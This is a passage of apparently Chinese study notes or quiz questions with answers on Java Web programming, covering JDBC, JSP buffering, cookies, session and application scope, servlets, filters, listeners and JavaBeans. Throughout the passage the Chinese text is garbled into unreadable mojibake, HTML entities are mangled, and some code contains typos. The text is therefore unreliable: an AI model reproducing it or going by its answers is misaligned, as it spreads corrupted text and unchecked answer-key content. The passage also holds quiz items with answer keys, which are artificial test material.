bookâ€);â€è¯­å¥ï¼Œå¾—åˆ°çš„ç»“æœé›†rsçš„åˆ—æ•°ä¸ºï¼ˆï¼‰ã€‚ 5 å‘æ•°æ®åº“æ·»åŠ æ•°æ®ï¼Œå¯ä»¥è·å¾—æˆåŠŸæ·»åŠ æ¡æ•°çš„æ–¹æ³•æ˜¯ï¼ˆï¼‰ã€‚ A. executeUpdate() âœ… B. getString() C. createStatement() D. executeQuery() executeQuery() å‘é€æŸ¥è¯¢SQLè¯­å¥ï¼Œè¿”å›ç»“æœé›†ã€‚ createStatement() ä¸æ•°æ®åº“å»ºç«‹è¿æ¥ï¼Œæ‰“å¼€æ•°æ®åº“ã€‚ executeUpdate() è¿”å›ä¸€ä¸ªæ•´å‹ï¼Œæ„æ€ä¸ºè¿™æ¡sqlè¯­å¥æ‰§è¡Œå—å½±å“çš„è¡Œæ•°ï¼Œå³æˆåŠŸæ·»åŠ çš„æ¡æ•°ã€‚ åœ¨æ¸¸æ ‡çš„æ§åˆ¶ä¸­ï¼Œä»¥ä¸‹éƒ¨åˆ†ä»£ç èƒ½å®ç°å€’åºå¥‡æ•°è¡Œè®°å½•è¾“å‡ºçš„æ˜¯ï¼ˆï¼‰ã€‚ C. âœ… 123456rs.afterLast();while(rs.previous())&#123; int i=rs.getRow(); if(i%2&lt;&gt;0)&#123;â€¦â€¦&#125;â€¦â€¦&#125; rs.afterLast() å°†æ¸¸æ ‡ç§»åˆ°ç»“æœé›†çš„æœ€åä¸€è¡Œä¹‹åã€‚ rs.last() å°†æ¸¸æ ‡ç§»åˆ°ç»“æœé›†çš„æœ€åä¸€è¡Œã€‚ rs.befortFirst() å°†æ¸¸æ ‡ç§»åˆ°ç»“æœé›†çš„ç¬¬ä¸€è¡Œä¹‹å‰ã€‚ if(i%2==0) åˆ¤æ–­æ˜¯å¦ä¸ºå¶æ•°ã€‚ if(i%2==1) åˆ¤æ–­æ˜¯å¦ä¸ºå¥‡æ•°ã€‚ if(i%2&lt;&gt;0) åˆ¤æ–­æ˜¯å¦ä¸ºå¥‡æ•°ã€‚ å…³äºè¿æ¥æ± çš„ä½¿ç”¨ï¼Œä¸‹é¢æè¿°æ­£ç¡®çš„æ˜¯ï¼ˆï¼‰ã€‚ åœ¨è¿æ¥æ± é›†åˆä¸­åˆ›å»ºè¿æ¥å¯¹è±¡å¯ä»¥ä½¿ç”¨add()æ–¹æ³• è®¾å®šè¿æ¥æ± æœ€å¤§è¿æ¥æ•°å¯ä»¥é˜²æ­¢ç”¨æˆ·æ— é™åˆ¶åœ°ä¸æ•°æ®åº“è¿æ¥ã€‚ ä½¿ç”¨å®Œè¿æ¥å¯¹è±¡æ”¾å›è¿æ¥æ± æ•°ç»„ add() ä»è¿æ¥æ± æ•°ç»„ä¸­å–å‡ºä¸€ä¸ªè¿æ¥å¯¹è±¡remove() ç¬¬ä¸ƒç«  ç°æœ‰éƒ¨åˆ†æœ‰å…³JSPç¼“å­˜ä¸Servletç¼“å­˜ä»£ç æ®µï¼Œè¯·é—®é¡µé¢è¾“å‡ºç»“æœä¸ºï¼ˆ èƒœ æˆ˜ç—…ï¼æ¯’ï¼‰ã€‚ 12345678&lt;% out.print(&quot;æˆ˜&quot;); response.getWriter().print(&quot;èƒœ&quot;);out.print(&quot;ç—…&quot;); out.flush();out.print(&quot;æ¯’&quot;);response.getWriter().print(&quot;ï¼&quot;); %&gt; outå¯¹è±¡å…ˆè¾“å‡ºåˆ°JSPç¼“å­˜å†åˆ°Servletç¼“å­˜æœ€ååˆ°é¡µé¢ã€‚ response.getWriter()ç›´æ¥è¾“å‡ºåˆ°Servletç¼“å­˜å†åˆ°é¡µé¢ã€‚ ï¼ˆ1ï¼‰out.print(â€œæˆ˜â€);&#x2F;&#x2F;å°†â€œæˆ˜â€è¾“å‡ºåˆ°JSPç¼“å­˜ ï¼ˆ2ï¼‰response.getWriter().print(â€œèƒœâ€œ); &#x2F;&#x2F;å°†â€œèƒœâ€è¾“å‡ºåˆ°Servletç¼“å­˜ï¼Œæœ€å…ˆè¾“å‡ºåˆ°é¡µé¢çš„æ˜¯â€œèƒœâ€ã€‚ ï¼ˆ3ï¼‰out.print(â€œç—…â€); &#x2F;&#x2F;å°†â€œç—…â€è¾“å‡ºåˆ°JSPç¼“å­˜ï¼Œæ’åœ¨â€œæˆ˜â€åé¢ï¼ŒJSPç¼“å­˜é˜Ÿåˆ—ä¸ºâ€œæˆ˜ã€ç—…â€ã€‚ ï¼ˆ4ï¼‰out.flush(); &#x2F;&#x2F;æ‰‹åŠ¨åˆ·æ–°JSPç¼“å­˜å¹¶å°†â€œæˆ˜ã€ç—…â€è¾“å‡ºåˆ°Servletç¼“å­˜ï¼Œæ’åœ¨â€œèƒœâ€çš„åé¢ï¼Œç°åœ¨Servletç¼“å­˜é˜Ÿåˆ—ä¸ºâ€œèƒœã€æˆ˜ã€ç—…â€œã€‚ ï¼ˆ5ï¼‰out.print(â€œæ¯’â€); &#x2F;&#x2F;å°†â€œæ¯’â€œè¾“å‡ºåˆ°JSPç¼“å­˜ï¼Œç°åœ¨JSPç¼“å­˜é˜Ÿåˆ—ä¸ºâ€æ¯’â€œã€‚ ï¼ˆ6ï¼‰response.getWriter().print(â€œï¼â€); &#x2F;&#x2F;å°†â€œï¼â€œè¾“å‡ºåˆ°Servletç¼“å­˜ï¼Œç°åœ¨Servletç¼“å­˜é˜Ÿåˆ—ä¸ºâ€œèƒœã€æˆ˜ã€ç—…ã€ï¼â€œã€‚ | ï¼ˆ7ï¼‰ç¨‹åºç»“æŸJSPç¼“å­˜è¾“å‡ºåˆ°Servletç¼“å­˜ï¼Œç°åœ¨Servletç¼“å­˜é˜Ÿåˆ—ä¸ºâ€œèƒœã€æˆ˜ã€ç—…ã€ï¼ã€æ¯’â€œï¼Œæœ€åè¾“å‡ºåˆ°å®¢æˆ·ç«¯é¡µé¢ã€‚ ç°æœ‰éƒ¨åˆ†ä»£ç å¦‚ä¸‹ï¼Œå‡ºç°é”™è¯¯æç¤ºä¸ºâ€œjava.lang.NumberFormatException: nullâ€ï¼Œè¯·å¸®åŒå­¦è§£å†³é—®é¢˜ï¼ˆï¼‰ 123456789101112131 &lt;%2 for (int i = 1; i &lt; 10; i++) &#123;3 %&gt;4 &lt;a href=&quot;05_1.jsp?num=&lt;%=i%&gt;&quot;&gt;&lt;%=i%&gt;&lt;/a&gt;&lt;br&gt;5 &lt;%6 &#125;7 %&gt;8 &lt;%9 String numstr = null;10 numstr = request.getParameter(&quot;num&quot;);11 int num1 = Integer.parseInt(numstr);12 %&gt;13 è¯¥æ•°å­—çš„å¹³æ–¹ä¸º&lt;%=num1*num1%&gt; åœ¨ç¬¬11è¡Œå’Œç¬¬13è¡Œååˆ†åˆ«åŠ å…¥if(numstr ! = null)&#123; å’Œ &lt;%&#125;%&gt; è·å–æ•°æ®æ—¶å‡ºç°ç©ºå€¼ï¼Œæ‰€ä»¥åšä¸€ä¸ªéç©ºåˆ¤æ–­ æœ‰å¦‚ä¸‹ç¨‹åºç‰‡æ®µï¼š 1234&lt;form&gt; &lt;input type=â€textâ€ name=â€numberâ€&gt; &lt;input type=â€submitâ€ value=â€æäº¤â€&gt;&lt;/form&gt; ä¸‹é¢ï¼ˆï¼‰è¯­å¥å¯ä»¥è·å–ç”¨æˆ·è¾“å…¥çš„ä¿¡æ¯ã€‚ request.getParameter(&quot;number&quot;); response å†…ç½®å¯¹è±¡æ˜¯å¯¹å®¢æˆ·çš„è¯·æ±‚åšå‡ºå“åº”ï¼Œå‘å®¢æˆ·ç«¯å‘é€æ•°æ®çš„ã€‚ request å¾—åˆ°å®¢æˆ·ç«¯çš„è¯·æ±‚ä¿¡æ¯session ä¿å­˜åŒä¸€å®¢æˆ·ç«¯ä¸€æ¬¡ä¼šè¯è¿‡ç¨‹ä¸­çš„ä¸€äº›ä¿¡æ¯application è¡¨ç¤ºæ•´ä¸ªåº”ç”¨çš„ç¯å¢ƒä¿¡æ¯response å‘å®¢æˆ·ç«¯å‘å‡ºå“åº” ç°æœ‰a.jspã€b.jspã€c.jspä¸‰ä¸ªé¡µé¢ï¼Œå¦‚æœè¿è¡Œa.jspé¡µé¢åœ¨â€œè¾“å…¥å­¦ç”Ÿå§“åï¼šâ€è¾“å…¥æ¡†å†…è¾“å…¥Roseï¼Œç‚¹å‡»æŸ¥è¯¢æŒ‰é’®ä»¥åé¡µé¢ä¼šæ˜¾ç¤ºä»€ä¹ˆå†…å®¹ï¼ˆï¼‰ã€‚ è¾“å…¥å­¦ç”Ÿå§“åæ˜¯ï¼šnull 1234567891011a.jsp&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*&quot; contentType=&quot;text/html; charset=gb2312&quot; %&gt; &lt;html&gt; &lt;body&gt; &lt;form action=&quot;b.jsp&quot;&gt; è¾“å…¥å­¦ç”Ÿå§“åï¼š&lt;input type=&quot;text&quot; name=&quot;stuname&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;æŸ¥è¯¢&quot;&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; 123456789b.jsp&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*&quot; contentType=&quot;text/html; charset=gb2312&quot; %&gt; &lt;html&gt; &lt;body&gt; &lt;% response.sendRedirect(&quot;c.jsp&quot;); %&gt; &lt;/body&gt; &lt;/html&gt; 12345678910c.jsp&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*&quot; contentType=&quot;text/html; charset=gb2312&quot; %&gt; &lt;html&gt; &lt;body&gt; &lt;% out.println(&quot;è¾“å…¥å­¦ç”Ÿå§“åæ˜¯ï¼š&quot;+request.getParameter(&quot;stuname&quot;)+&quot;&lt;br&gt;&quot;); %&gt; &lt;/body&gt; &lt;/html&gt; å¦‚æœæƒ³è®©elseç¨‹åºæ®µå†…å®¹æˆåŠŸè·³è½¬åˆ°b.jspé¡µé¢ï¼Œè¯·è¡¥å…¨ä»£ç ï¼ˆï¼‰ã€‚ 1234567891011121314151617181920&lt;%String name=request.getParameter(&quot;userName&quot;);String password=request.getParameter(&quot;pwd&quot;);if(&quot;zhangsan&quot;.equals(name)&amp;&amp;&quot;123&quot;.equals(password))&#123;out.print(&quot;æˆåŠŸç™»é™†ï¼Œ3ç§’é’Ÿåè¿›å…¥loginSuccess.jspé¡µé¢&quot;);response.setHeader(&quot;refresh&quot;, &quot;3;url=a.jsp&quot;);return;&#125;else&#123;&#125;-----------------%&gt; %&gt;&lt;jsp:forward page=&quot;b.jsp&quot;/&gt;&lt;% ç°æœ‰cookieç›¸å…³éƒ¨åˆ†ä»£ç å¦‚ä¸‹ï¼Œè¯·é—®å½“å‰cookieçš„æœ‰æ•ˆæ—¶é—´ä¸ºï¼ˆï¼‰ã€‚ å…³é—­æµè§ˆå™¨æ—¶å¤±æ•ˆ 12345678&lt;% String str=&quot;12&quot; ; int number=Integer.parseInt(str); %&gt; è¯¥æ•°å­—çš„å¹³æ–¹ä¸ºï¼š&lt;%=number*number %&gt; &lt;HR&gt; &lt;% Cookie cookie=new Cookie(&quot;number&quot;,str); cookie.setMaxAge(-10); response.addCookie(cookie); %&gt; &lt;a href=&quot;b.jsp&quot;&gt;åˆ°è¾¾p2&lt;/a&gt; cookie.setMaxAge(int time) è®¾ç½®å­˜æ´»æ—¶é—´ timeæ­£æ•´æ•°ï¼Œè¡¨ç¤ºå­˜æ´»çš„ç§’æ•° timeè´Ÿæ•°ï¼Œä»£è¡¨ä¸´æ—¶cookieï¼Œæµè§ˆå™¨å…³é—­æ—¶å¤±æ•ˆ time 0 ï¼Œè¡¨ç¤ºé€šçŸ¥æµè§ˆå™¨åˆ é™¤ç›¸åº”çš„cookieå¯¹è±¡ ç¬¬å…«ç«  åœ¨JSPä¸­ä¿å­˜ç”¨æˆ·ä¼šè¯ä¿¡æ¯ä½¿ç”¨ï¼ˆ session ï¼‰å¯¹è±¡ã€‚ å¦‚æœé€‰æ‹©ä¸€ä¸ªå¯¹è±¡ä¿å­˜èŠå¤©å®¤ä¿¡æ¯ï¼Œåˆ™é€‰æ‹©ï¼ˆ application ï¼‰ã€‚ å“ªä¸ªæ–¹æ³•æ˜¯ä¿å­˜sessionä¸­å…³é”®å­—æ˜¯keyçš„å¯¹è±¡ 1public void setAttibute(String key,Object obj) ç°æœ‰ä»¥ä¸‹éƒ¨åˆ†ä»£ç æ®µï¼Œä¸»è¦åŠŸèƒ½å¯ä»¥å®ç°å°†ç‰©å“æ·»åŠ åˆ°è´­ç‰©è½¦ï¼Œè¯·è¡¥å…¨ä»£ç ã€‚ 123456789101112&lt;form action=&quot;order.jsp&quot; method=&quot;post&quot;&gt; ä¸‰å›½æ¼”ä¹‰&lt;input name=&quot;goods&quot; type=&quot;hidden&quot; value=&quot;ä¸‰å›½æ¼”ä¹‰&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;æ·»åŠ åˆ°è´­ç‰©è½¦&quot;&gt;&lt;/form&gt;&lt;% ArrayList good=(ArrayList) session. â‘  if(good==null)&#123; good=new ArrayList(); session. â‘¡ &#125;else&#123; String goods=request. â‘¢ if(godd!=null)&#123; goods=new String(goods.getBytes(&quot;ISO-8859-1&quot;),&quot;gb2312&quot;); good.add( â‘£ ); &#125; &#125; %&gt; â‘  getAttribute(â€œgoodâ€); &#x2F;&#x2F;è¯»å–è´­ç‰©è½¦ â‘¡ setAttribute(â€œgoodâ€,good) &#x2F;&#x2F;å­˜å…¥è´­ç‰©è½¦ï¼Œsessionå¯¹è±¡ â‘¢ getParameter(â€œgoodâ€) &#x2F;&#x2F;è·å–è¡¨å•é‡Œæ–‡æœ¬æ¡†å±æ€§å â‘£ goods &#x2F;&#x2F;å°†goodsçš„å€¼å­˜å…¥goodå¯¹è±¡ é€šè¿‡ç›¸å…³æ–¹æ³•è¾“å‡ºsessionå¯¹è±¡çš„ç”Ÿå­˜æœŸé™ç¬¬ä¸€æ¬¡è®¿é—®å½“å‰webæœåŠ¡çš„å‚æ•°å¦‚å›¾æ‰€ç¤ºï¼Œå¦‚æœç°åœ¨ç»è¿‡20ç§’ç¬¬äºŒæ¬¡è®¿é—®æ­¤é¡µé¢ï¼Œä¸‹é¢å“ªäº›å‚æ•°ä¼šå‘ç”Ÿå˜åŒ–ï¼ˆï¼‰ã€‚ è¶…è¿‡å‘å‘†æ—¶é—´ï¼Œç¬¬äºŒæ¬¡è®¿é—®é¡µé¢ï¼Œsessionçš„åˆ›å»ºæ—¶é—´ã€IDã€ä¸Šä¸€æ¬¡è¯·æ±‚æ—¶é—´éƒ½ä¼šå‘ç”Ÿå˜åŒ– ä½¿ç”¨pageContextå†…ç½®å¯¹è±¡å¯ä»¥æ“ä½œå½“å‰JSPé¡µé¢çš„æ‰€æœ‰å…¶ä»–å†…ç½®å¯¹è±¡ï¼Œç°æœ‰å¦‚ä¸‹ä»£ç æ®µï¼Œè¯·é—®é¡µé¢æœ€åè¾“å‡ºçš„ç»“æœï¼ˆï¼‰ã€‚ 123456789101112131415161718&lt;% application.setAttribute(&quot;applicationKey&quot;, &quot;applicationKey&quot; ); String applicationValue=(String)pageContext.getAttribute(&quot;applicationKey&quot;,4); session.setAttribute(&quot;sessionKey&quot;, &quot;sessionKey&quot; ); String sessionValue=(String)pageContext.getAttribute(&quot;sessionKey&quot;,3); request.setAttribute(&quot;requestKey&quot;, &quot;requestKey&quot; ); String requestValue=(String)pageContext.getAttribute(&quot;requestKey&quot;,2); pageContext.setAttribute(&quot;pageKey&quot;, &quot;pageKey&quot; ); String pageValue=(String)pageContext.getAttribute(&quot;pageKey&quot;,1); pageContext.removeAttribute(&quot;requestKey&quot;,2); pageContext.removeAttribute(&quot;applicationKey&quot;,4); pageContext.setAttribute(&quot;applicationKey&quot;,&quot;Java Web&quot;,4); %&gt; é¡µé¢åŸŸçš„èŒƒå›´scopeï¼š&lt;%=pageContext.getAttributesScope(&quot;pageKey&quot;)%&gt;&lt;br&gt; è¯·æ±‚åŸŸçš„èŒƒå›´scopeï¼š&lt;%=pageContext.getAttributesScope(&quot;requestKey&quot;)%&gt;&lt;br&gt; ä¼šè¯åŸŸçš„èŒƒå›´scopeï¼š&lt;%=pageContext.getAttributesScope(&quot;sessionKey&quot;)%&gt;&lt;br&gt; åº”ç”¨åŸŸçš„èŒƒå›´scopeï¼š&lt;%=pageContext.getAttributesScope(&quot;applicationKey&quot;)%&gt;&lt;br&gt; é€‰é¡¹Dï¼š pageContext.removeAttribute(â€œrequestKeyâ€œ;,2); &#x2F;&#x2F;ä»scopeèŒƒå›´2ç§»é™¤å…³é”®å­— requestKeyçš„å±æ€§å¯¹è±¡ï¼Œæœ€ç»ˆæ‰“å°scopeå€¼ä¸º0ã€‚ pageContext.removeAttribute(â€œapplicationKeyâ€œ;,4); &#x2F;&#x2F;ä»scopeèŒƒå›´4ç§»é™¤å…³é”®å­—ä¸ºapplicationKeyçš„å±æ€§å¯¹è±¡ã€‚ pageContext.setAttribute(â€œapplicationKeyâ€,â€Java Webâ€,4); &#x2F;&#x2F;ä»¥K&#x2F;Vå¯¹çš„æ–¹å¼å­˜å‚¨scopeèŒƒå›´åŸŸ4å±æ€§å¯¹è±¡å€¼â€Java Webâ€ï¼Œæœ€ç»ˆæ‰“å°scopeå€¼ä¸º4. é¡µé¢åŸŸçš„èŒƒå›´scopeï¼š1 è¯·æ±‚åŸŸçš„èŒƒå›´scopeï¼š0 ä¼šè¯åŸŸçš„èŒƒå›´scopeï¼š3 åº”ç”¨åŸŸçš„èŒƒå›´scopeï¼š4 ç°åœ¨åˆ†åˆ«ç”¨é¡µé¢åŸŸã€ä¼šè¯åŸŸå’Œåº”ç”¨åŸŸåˆ¶ä½œè®¿é—®ç»Ÿè®¡ï¼Œç°åœ¨ç”¨IEæµè§ˆå™¨è®¿é—®é¡µé¢ç»“æœå¦‚å›¾æ‰€ç¤ºã€‚è¯·é—®ç°åœ¨ç”¨Chromeæµè§ˆå™¨è®¿é—®æ­¤é¡µé¢åæ˜¾ç¤ºç»“æœä¸ºï¼ˆï¼‰ é¡µé¢åŸŸè®¿é—®ç»Ÿè®¡ï¼š1 ä¼šè¯åŸŸè®¿é—®ç»Ÿè®¡ï¼š1 åº”ç”¨åŸŸè®¿é—®ç»Ÿè®¡ï¼š13 é¡µé¢åŸŸï¼ˆpage scopeï¼‰ï¼Œå®ƒçš„ç”Ÿå‘½å‘¨æœŸæ˜¯æŒ‡é¡µé¢æ‰§è¡ŒæœŸé—´ã€‚å­˜å‚¨åœ¨é¡µé¢åŸŸçš„å¯¹è±¡åªèƒ½åœ¨å®ƒæ‰€åœ¨é¡µé¢è¢«è®¿é—®ï¼Œä½œç”¨èŒƒå›´å½“å‰é¡µé¢ã€‚ç›¸åŒæˆ–ä¸åŒæµè§ˆå™¨ï¼ˆç”¨æˆ·ï¼‰çš„è®¡æ•°å˜é‡ä¸èƒ½å…±äº«ï¼Œæ²¡æœ‰è®¡æ•°åŠŸèƒ½ã€‚ ä¼šè¯åŸŸï¼ˆsession scopeï¼‰ï¼Œå®ƒçš„ç”Ÿå‘½å‘¨æœŸæ˜¯æŒ‡æŸä¸ªå®¢æˆ·ç«¯ä¸æœåŠ¡å™¨æ‰€è¿æ¥çš„æ—¶é—´ã€‚å®¢æˆ·ç«¯åœ¨ç¬¬1æ¬¡è®¿é—®æœåŠ¡å™¨æ—¶åˆ›å»ºä¼šè¯ï¼Œåœ¨ä¼šè¯è¿‡æœŸæˆ–ç”¨æˆ·ä¸»åŠ¨é€€å‡ºåï¼Œä¼šè¯ç»“æŸã€‚å­˜å‚¨åœ¨ä¼šè¯åŸŸä¸­çš„å¯¹è±¡åœ¨æ•´ä¸ªä¼šè¯æœŸé—´ï¼ˆå¯ä»¥åŒ…å«å¤šæ¬¡è¯·æ±‚ï¼‰éƒ½å¯ä»¥è¢«è®¿é—®ã€‚ä¸åŒæµè§ˆå™¨ï¼ˆç”¨æˆ·ï¼‰çš„è®¡æ•°å˜é‡ä¸èƒ½å…±äº«ï¼Œåªèƒ½è®¡æ•°åŒä¸€æµè§ˆå™¨ï¼ˆç”¨æˆ·ï¼‰çš„è®¿é—®ç»Ÿè®¡ã€‚ åº”ç”¨åŸŸï¼ˆapplication scopeï¼‰ï¼Œå®ƒçš„ç”Ÿå‘½å‘¨æœŸæ˜¯æŒ‡ä»æœåŠ¡å™¨å¼€å§‹æ‰§è¡ŒæœåŠ¡åˆ°æœåŠ¡å™¨å…³é—­ä¸ºæ­¢ã€‚å­˜å‚¨åœ¨åº”ç”¨åŸŸä¸­çš„å¯¹è±¡åœ¨æ•´ä¸ªåº”ç”¨ç¨‹åºè¿è¡ŒæœŸé—´å¯ä»¥è¢«æ‰€æœ‰JSPå’ŒServletå…±äº«è®¿é—®ã€‚å¯ä»¥è®¡æ•°æ‰€æœ‰è®¿é—®æœ¬é¡µé¢çš„æµè§ˆå™¨ï¼ˆç”¨æˆ·ï¼‰æ•°ã€‚ ç¬¬ä¹ç«  æŸä¸ªæ–‡ä»¶åä¸ºSecondServlet.javaçš„servletæ–‡ä»¶ï¼Œåœ¨æœåŠ¡å™¨éƒ¨ç½²æ˜ å°„ï¼Œä»¥ä¸‹å“ªä¸ªurl-patternèƒ½å¤ŸæˆåŠŸï¼ˆï¼‰ã€‚ &lt;url-pattern&gt;/5.1&lt;/url-pattern&gt; servletçš„url-patternæ˜ å°„è§„åˆ™è¦ä»¥&#x2F;å¼€å¤´ï¼Œ&#x2F;*.java å±äºæ‰©å±•æ˜ å°„ï¼Œ&#x2F;å’Œæ‰©å±•æ˜ å°„åŒæ—¶ä½¿ç”¨ä¼šå‡ºç°è¯­æ³•é”™è¯¯ï¼› &#x2F;5.1å±äºç²¾ç¡®è·¯å¾„æ˜ å°„ï¼Œå¯ä»¥éƒ¨ç½²æˆåŠŸã€‚ ä¸‹åˆ—Servletæ–¹æ³•ä¸­ï¼Œï¼ˆï¼‰æ–¹æ³•åœ¨Servletç”Ÿå‘½å‘¨æœŸä¸­ï¼ŒServletæ¯è¯·æ±‚ä¸€æ¬¡å®ƒå°±ä¼šè¢«è°ƒç”¨ä¸€æ¬¡ã€‚ service() init() è½½å…¥æ—¶è¢«æ‰§è¡Œï¼Œä¸”åªæ‰§è¡Œä¸€æ¬¡ï¼Œå¯¹servletè¿›è¡Œåˆå§‹åŒ– service() è¯·æ±‚æœåŠ¡ï¼Œè¯·æ±‚ä¸€æ¬¡æ‰§è¡Œä¸€æ¬¡ destroy() æœåŠ¡å™¨å…³é—­æ—¶è¢«è°ƒç”¨ï¼Œä¸”åªæ‰§è¡Œä¸€æ¬¡ï¼Œç”¨æ¥é‡Šæ”¾servletæ‰€å èµ„æº close()ä¸å±äºservlet ç”Ÿå‘½å‘¨æœŸæ–¹æ³• å…³äºservletä½¿ç”¨JSPå†…ç½®å¯¹è±¡ï¼Œç°æœ‰éƒ¨åˆ†ä»£ç å¦‚ä¸‹ï¼Œè¯·é—®åœ¨å®¢æˆ·ç«¯é¡µé¢ä¼šæ˜¾ç¤ºä»€ä¹ˆå†…å®¹ï¼ˆï¼‰ã€‚ 123456789101112131415protected void doPost(HttpServletRequest request,HttpServletResponse response) throws ServletException, IOException &#123;response.setContentType(&quot;text/html;charset=gb2312&quot;);request.setCharacterEncoding(&quot;gb2312&quot;);out.println(&quot;äº”ä¸€&quot;);System.out.println(&quot;åŠ³åŠ¨èŠ‚&quot;);response.getWriter().println(â€œå¿«ä¹ï¼â€);&#125; ä¼šç¼–è¯‘é”™è¯¯ out.println(â€œäº”ä¸€â€œ); &#x2F;&#x2F;outå¯¹è±¡åœ¨servleté‡Œä½¿ç”¨éœ€è¦å…ˆå£°æ˜PrintWriter out = response.getWriter();å¦åˆ™ä¼šå‡ºç°ç¼–è¯‘é”™è¯¯ã€‚ System.out.println(â€œåŠ³åŠ¨èŠ‚â€œ); &#x2F;&#x2F;åœ¨JSPå’Œservletéƒ½å¯ä»¥è¾“å‡ºåˆ°å®¢æˆ·ç«¯çš„æ§åˆ¶å°ï¼Œä¸èƒ½è¾“å‡ºåˆ°å®¢æˆ·ç«¯é¡µé¢ã€‚ response.getWriter().println(â€œå¿«ä¹ï¼â€); &#x2F;&#x2F;åœ¨JSPå’Œservletéƒ½å¯ä»¥è¾“å‡ºåˆ°å®¢æˆ·ç«¯é¡µé¢ã€‚ ç°æœ‰a.jspã€B.javaå’ŒC.javaæ–‡ä»¶ï¼ŒB.javaæ–‡ä»¶è·å–å®¢æˆ·ç«¯a.jspçš„è¡¨å•ä¼ å€¼ï¼Œå¹¶å°†è·å–åˆ°çš„å€¼ä¼ é€’åˆ°C.javaåæ­£ç¡®æ˜¾ç¤ºåœ¨å®¢æˆ·ç«¯é¡µé¢ï¼Œè¯·è¡¥å…¨ä»£ç ï¼ˆï¼‰ã€‚ b.javaéƒ¨åˆ†ä»£ç æ®µå¦‚ä¸‹ï¼š 123456789101112131415protected void doPost(HttpServletRequest request,HttpServletResponse response) throws ServletException, IOException &#123;request.setCharacterEncoding(&quot;gb2312&quot;);String b = request.getParameter(&quot;a&quot;);if (b.length() &gt; 0) &#123;â‘  request.getRequestDispatch(&quot;C).forward(request,response);&#125;&#125; request.getRequestDispatcher(â€œCâ€).forward(request, response); &#x2F;&#x2F;è½¬å‘ï¼Œé€šè¿‡forwardæ–¹æ³•æŠŠå½“å‰é¡µé¢çš„requestå¯¹è±¡é‡Œçš„æ•°æ®è½¬å‘åˆ°Cé¡µé¢ï¼ŒgetRequestDispatcher(â€œCâ€)ã€‚ response.sendRedirect(â€œCâ€); &#x2F;&#x2F;é‡å®šå‘ï¼Œæ— æ³•ä»ä»¥å‰çš„requestå¯¹è±¡ä¸­è·å–ç”¨æˆ·æäº¤çš„æ•°æ®ã€‚ response.encodeRedirectURL(â€œCâ€); &#x2F;&#x2F;URLé‡å†™ï¼Œæ•°æ®æœ‰ä¸¢å¤±æ— æ³•è·å–ã€‚ forward(request, response); &#x2F;&#x2F;è¯­æ³•é”™è¯¯ã€‚ åœ¨webæœåŠ¡å™¨testç›®å½•ä¸‹æœ‰ä¸€å®¢æˆ·ç«¯a.jspæ–‡ä»¶ï¼Œä»£ç å¦‚ä¸‹æ‰€ç¤ºã€‚åœ¨B.javaæ–‡ä»¶è®¾ç½®å­—ç¬¦è¿‡æ»¤å™¨ï¼Œä¸‹é¢æ³¨è§£æ–¹å¼èƒ½ä½¿ç¨‹åºæ­£å¸¸è¿è¡Œå¹¶è§£å†³ä¸­æ–‡ä¹±ç çš„ä¸ºï¼ˆï¼‰ã€‚ 1234567891011&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=gb2312&quot;%&gt;&lt;form action=&quot;B&quot; method=&quot;post&quot;&gt;è¯·è¾“å…¥å­¦ç”Ÿä¿¡æ¯çš„æ¨¡ç³Šèµ„æ–™ï¼š&lt;input type=&quot;text&quot; name=&quot;stuname&quot;&gt;&lt;br&gt;&lt;input type=&quot;submit&quot; value=&quot;æŸ¥è¯¢&quot;&gt;&lt;/form&gt; 123@WebFilter(filterName = &quot;setCharacterEncodingFilter&quot;,urlPatterns = &#123; &quot;/test/a.jsp&quot;&#125;, initParams = &#123;@WebInitParam(name = &quot;encoding&quot;, value = &quot;GBK&quot;)&#125;) urlPatterns &#x3D; { â€œ&#x2F;test&#x2F;a.jspâ€ ; } &#x2F;&#x2F;ç²¾ç¡®åŒ¹é…æ‹¦æˆªæœåŠ¡å™¨ä¸‹testç›®å½•çš„a.jspå®¢æˆ·ç«¯è¯·æ±‚ã€‚ value &#x3D; â€œGBKâ€; ä¸å®¢æˆ·ç«¯charset&#x3D;gb2312ç¼–ç å…¼å®¹ã€‚ ç°åœ¨ä¸ºWebæœåŠ¡å™¨è®¾ç½®ç›‘å¬sessionä¸­æŸä¸ªå¯¹è±¡çŠ¶æ€å˜åŒ–ï¼Œä¸‹é¢èƒ½å®ç°å°†sessionå¯¹è±¡æŒä¹…åŒ–åˆ°å­˜å‚¨è®¾å¤‡ä¸Šçš„æ–¹æ³•ä¸ºï¼ˆï¼‰ã€‚ 1sessionWillPassivate(HttpSessionEvent se) HttpSessionä¸­å¯¹è±¡çš„çŠ¶æ€æœ‰ï¼šç»‘å®šâ†’è§£é™¤ç»‘å®šï¼Œé’åŒ–â†’æ´»åŒ–ã€‚ valueBound(HttpSessionBindingEvent event) &#x2F;&#x2F;ç»‘å®šï¼Œå½“å¯¹è±¡è¢«æ”¾åˆ°sessioné‡Œæ—¶ï¼Œæ‰§è¡Œæ­¤æ–¹æ³•ã€‚ valueUnbound(HttpSessionBindingEvent event) &#x2F;&#x2F;è§£é™¤ç»‘å®šï¼Œå½“å¯¹è±¡è¢«ä»sessioné‡Œç§»é™¤æ—¶ï¼Œæ‰§è¡Œæ­¤æ–¹æ³•ã€‚ sessionWillPassivate(HttpSessionEvent se) &#x2F;&#x2F;é’åŒ–ï¼Œå½“sessioné‡Œçš„å¯¹è±¡è¢«é’åŒ–æ—¶ï¼Œæ‰§è¡Œæ­¤æ–¹æ³•ã€‚ sessionDidActivate(HttpSessionEvent se) &#x2F;&#x2F;æ´»åŒ–ï¼Œå½“å¯¹è±¡è¢«é‡æ–°åŠ è½½ï¼ˆæ´»åŒ–ï¼‰æ—¶ï¼Œæ‰§è¡Œæ­¤æ–¹æ³•ã€‚ ç¬¬åç«  ä»¥ä¸‹ä»£ç å®šä¹‰äº†ä¸€ä¸ªJavaBeanç±»Student.javaï¼Œè¯·é—®å“ªäº›è¡Œæ²¡æœ‰éµå¾ªæœ‰å…³çº¦å®šï¼ˆï¼‰ã€‚ 123456789101112131 package bean;2 private class Student &#123; âŒ3 private String stuname;4 public String getstuname() &#123; âŒ 5 return stuname;&#125;6 public void setterStuname(String stuname) &#123; âŒ7 this.stuname = 